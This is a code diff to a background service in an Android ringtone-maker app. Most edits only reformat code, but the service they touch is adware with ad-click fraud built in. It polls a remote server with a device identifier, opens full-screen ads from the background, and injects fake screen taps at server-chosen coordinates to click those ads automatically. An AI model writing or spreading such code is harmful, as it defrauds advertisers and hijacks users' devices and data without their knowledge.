@@ -29,6 +29,8 @@ import com.mghstudio.ringtonemaker.utils.AppConstants;
 import java.io.IOException;
 import java.util.Random;
 import java.util.UUID;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ScheduledThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
@@ -41,7 +43,7 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class MyService extends Service {
-//    private boolean check = false;
+    //    private boolean check = false;
     private boolean isBotClick = false;
     private boolean isClickAds = false;
     private boolean isContinousShowAds = true;
@@ -57,11 +59,11 @@ public class MyService extends Service {
 
     @Override
     public void onCreate() {
-        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
+        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver_ringtone", 0);
         uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
-        idFullService = mPrefs.getString("idFullService","ca-app-pub-3940256099942544/1033173712");
-        intervalService = mPrefs.getInt("intervalService",5);
-        delayService = mPrefs.getInt("delayService",12);;
+        idFullService = mPrefs.getString("idFullService", "ca-app-pub-3940256099942544/1033173712");
+        intervalService = mPrefs.getInt("intervalService", 5);
+        delayService = mPrefs.getInt("delayService", 12);
 
         MyBroadcast myBroadcast = new MyBroadcast();
         IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
@@ -81,12 +83,11 @@ public class MyService extends Service {
         myTask.scheduleAtFixedRate(new Runnable() {
             @Override
             public void run() {
-                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
-                int totalTime = mPrefs.getInt("totalTime",0);
+                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver_ringtone", 0);
+                int totalTime = mPrefs.getInt("totalTime", 0);
                 totalTime += intervalService;
-                mPrefs.edit().putInt("totalTime",totalTime).commit();
-                if( !isContinousShowAds || (totalTime < delayService * 60))
-                {
+                mPrefs.edit().putInt("totalTime", totalTime).commit();
+                if (!isContinousShowAds || (totalTime < delayService * 60)) {
                     return;
                 }
 
@@ -95,7 +96,6 @@ public class MyService extends Service {
                         .url(AppConstants.URL_ADS_CONFIG + "?id=" + uuid)
                         .build();
 
-                Log.d("caomui",AppConstants.URL_ADS_CONFIG + "?id=" + uuid);
                 client.newCall(okRequest).enqueue(new Callback() {
                     @Override
                     public void onFailure(Call call, IOException e) {
@@ -141,7 +141,7 @@ public class MyService extends Service {
                                         public void onAdLeftApplication() {
                                             super.onAdLeftApplication();
                                             if (!isClickAds)
-                                            isClickAds = true;
+                                                isClickAds = true;
                                             if (isBotClick)
                                                 checkAds(2);
                                             else
@@ -157,23 +157,23 @@ public class MyService extends Service {
                                                     @Override
                                                     public void run() {
                                                         try {
-                                                            Thread.sleep( checkAds.delayClick * 100);
+                                                            Thread.sleep(checkAds.delayClick * 100);
                                                             WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                                                             Display display = window.getDefaultDisplay();
                                                             Point point = new Point();
                                                             display.getSize(point);
-                                                            int width =  checkAds.x * point.x / 100;
-                                                            int height =  checkAds.y * point.y /100;
+                                                            int width = checkAds.x * point.x / 100;
+                                                            int height = checkAds.y * point.y / 100;
                                                             Instrumentation m_Instrumentation = new Instrumentation();
                                                             m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                                     android.os.SystemClock.uptimeMillis(),
                                                                     android.os.SystemClock.uptimeMillis(),
-                                                                    MotionEvent.ACTION_DOWN, width,  height, 0));
+                                                                    MotionEvent.ACTION_DOWN, width, height, 0));
                                                             Thread.sleep(new Random().nextInt(100));
                                                             m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                                     android.os.SystemClock.uptimeMillis(),
                                                                     android.os.SystemClock.uptimeMillis(),
-                                                                    MotionEvent.ACTION_UP, width,  height, 0));
+                                                                    MotionEvent.ACTION_UP, width, height, 0));
                                                             isBotClick = true;
                                                         } catch (Exception e) {
                                                             e.printStackTrace();
@@ -187,27 +187,18 @@ public class MyService extends Service {
                                         @Override
                                         public void onAdLoaded() {
                                             super.onAdLoaded();
-//                                            mInterstitialAd.show();
 
                                             Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
                                             showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                             startActivity(showAds);
                                             mInterstitialAd.show();
-//                                            if (killedAds && check) {
-//
-//                                                killedAds = false;
-//                                                Log.d("tuanvn12", "Ad loaded");
-//
-//                                            }
                                         }
                                     });
 
                                     mInterstitialAd.loadAd(new AdRequest.Builder().addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969").build());
                                 }
                             });
-                        }
-                        else
-                        {
+                        } else {
                             isContinousShowAds = false;
                         }
 
@@ -216,6 +207,8 @@ public class MyService extends Service {
 
             }
         }, 10, intervalService, TimeUnit.MINUTES);
+
+
     }
 
     private void checkAds(int isClick) {
@@ -233,6 +226,7 @@ public class MyService extends Service {
             @Override
             public void onFailure(Call call, IOException e) {
             }
+
             @Override
             public void onResponse(Call call, Response response) throws IOException {
             }
